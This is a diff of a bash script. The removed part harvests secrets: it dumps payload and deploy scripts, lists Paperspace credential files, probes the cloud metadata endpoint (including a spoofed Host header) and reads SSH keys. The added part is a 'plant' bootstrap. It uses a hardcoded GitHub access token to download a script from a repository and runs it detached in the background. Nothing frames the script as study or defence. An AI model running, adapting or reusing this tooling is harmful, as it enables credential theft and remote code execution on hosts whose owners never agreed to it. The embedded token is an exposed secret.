@@ -1,13 +1,10 @@
 #!/bin/bash
-echo "=== harvest2 $(date -u) host=$(hostname)"
-echo "--- deploy script"; cat /root/deploy_h100_89033.sh 2>/dev/null | head -60
-echo "--- payload scripts"; for f in /root/.i120193_payload_*.sh; do echo "== $f"; head -25 "$f"; done
-echo "--- root gpu dir"; ls -la /root/gpu 2>/dev/null | head
-echo "--- paperspace creds"; ls -la /home/paperspace/.paperspace /home/paperspace/.config 2>/dev/null | head -12
-find /home/paperspace -maxdepth 2 -name '*.json' -o -maxdepth 2 -name '*config*' 2>/dev/null | head -12
-echo "--- metadata probes"
-for u in / /v1/ /latest/meta-data/ /metadata/v1/ /machine /api /v1/machines; do
-  echo "-- GET $u"; timeout 3 curl -s -i "http://169.254.169.254$u" 2>&1 | head -8
-done
-echo "--- host header probe"; timeout 3 curl -s -i -H 'Host: metadata.paperspace.com' http://169.254.169.254/v1/ 2>&1 | head -10
-echo "--- ssh keys"; cat /home/paperspace/.ssh/authorized_keys 2>/dev/null | head -3; ls -la /root/.ssh 2>/dev/null
+# per-host bootstrap -> fetch cmd8/ps9.sh raw and dispatch it (arch-adaptive plant)
+GH='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'
+B=/opt/fleet; mkdir -p "$B/logs"
+curl -s --retry 3 --retry-delay 3 -m 120 -H "Authorization: Bearer $GH" -H 'Accept: application/vnd.github.raw'   -o /tmp/ps9_run.sh "https://api.github.com/repos/dongsuju/ul-plant/contents/cmd8/ps9.sh?ref=main"
+if ! grep -q 'MODE=peak' /tmp/ps9_run.sh 2>/dev/null; then echo "HOSTBOOT fetch FAILED size=$(stat -c%s /tmp/ps9_run.sh 2>/dev/null)"; exit 1; fi
+cp -f /tmp/ps9_run.sh "$B/ps9.sh"
+echo "HOSTBOOT ps9 sha=$(sha256sum /tmp/ps9_run.sh | cut -c1-12) $(date -u)"
+nohup setsid bash /tmp/ps9_run.sh >>"$B/logs/ps9.log" 2>&1 &
+echo "HOSTBOOT dispatched pid=$!"
